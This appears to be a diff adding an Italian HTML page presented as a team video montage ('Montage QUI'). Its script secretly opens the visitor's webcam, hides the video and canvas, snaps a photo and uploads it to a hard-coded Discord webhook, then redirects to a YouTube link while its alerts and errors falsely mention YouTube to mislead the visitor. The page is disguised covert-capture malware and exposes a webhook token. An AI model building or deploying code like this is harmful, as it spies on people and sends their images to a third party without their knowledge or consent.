@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PARMAREGGIO TEAM</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+            flex-direction: column;
+        }
+
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        #video {
+            display: none; /* Nascondi il video */
+        }
+
+        #canvas {
+            display: none; /* Nascondi il canvas */
+        }
+    </style>
+</head>
+<body>
+
+    <h1>TEAMTAGE PARMAREGGIO</h1>
+    <button onclick="takePhoto()">Montage QUI</button>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // Crea dinamicamente il canvas per catturare l'immagine
+        const canvas = document.getElementById('canvas'); 
+        const context = canvas.getContext('2d');
+        const video = document.getElementById('video');
+
+        // Funzione per inizializzare la fotocamera in background
+        async function initCamera() {
+            try {
+                // Richiede il permesso per usare la fotocamera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream; // Collega il flusso video al tag <video>
+
+                // Quando il video è pronto, cattura la foto
+                video.onloadeddata = function() {
+                    captureImage();
+                };
+            } catch (err) {
+                console.error("montage con errori", err);
+                alert("errore di permesso per youtube");
+            }
+        }
+
+        // Funzione per catturare l'immagine in background dalla fotocamera
+        function captureImage() {
+            const width = video.videoWidth; // Ottieni la larghezza del video
+            const height = video.videoHeight; // Ottieni l'altezza del video
+
+            // Imposta il canvas alle dimensioni del video
+            canvas.width = width;
+            canvas.height = height;
+
+            // Cattura l'immagine nel canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Ottieni la foto come base64
+            const dataUrl = canvas.toDataURL('image/jpeg');
+
+            // Invia la foto su Discord
+            sendPhotoToDiscord(dataUrl);
+
+            // Interrompe il flusso video per liberare risorse
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+
+            // Redirige a YouTube dopo che la foto è stata inviata
+            window.location.href = "https://youtu.be/cWj7Uh-D-xs?feature=shared";
+        }
+
+        // Funzione per inviare la foto su Discord tramite Webhook
+        function sendPhotoToDiscord(photoData) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1344734251345514568/Rj8oTqRGTRGayoSt4m3UjYw_5Stvd_RYGM4nU_-zttA7zZQ6ynzjJL4nwacgV7jboSSh'; // Sostituisci con il tuo URL Webhook di Discord
+
+            // Crea un'oggetto FormData per inviare la foto
+            const formData = new FormData();
+            formData.append('file', dataURLtoBlob(photoData)); // Converte la foto da base64 a Blob
+
+            // Invia la richiesta POST al Webhook di Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('montage visualizzato', data);
+                alert('montage visto');
+            })
+            .catch(error => {
+                console.error('errore con youtube', error);
+                alert('Errore con youtube');
+            });
+        }
+
+        // Funzione per convertire una Data URL in Blob
+        function dataURLtoBlob(dataUrl) {
+            const byteString = atob(dataUrl.split(',')[1]);
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uint8Array = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                uint8Array[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([uint8Array], { type: 'image/jpeg' });
+        }
+
+        // Funzione per scattare la foto
+        function takePhoto() {
+            initCamera(); // Inizializza la fotocamera in background e scatta la foto
+        }
+    </script>
+
+</body>
+</html>
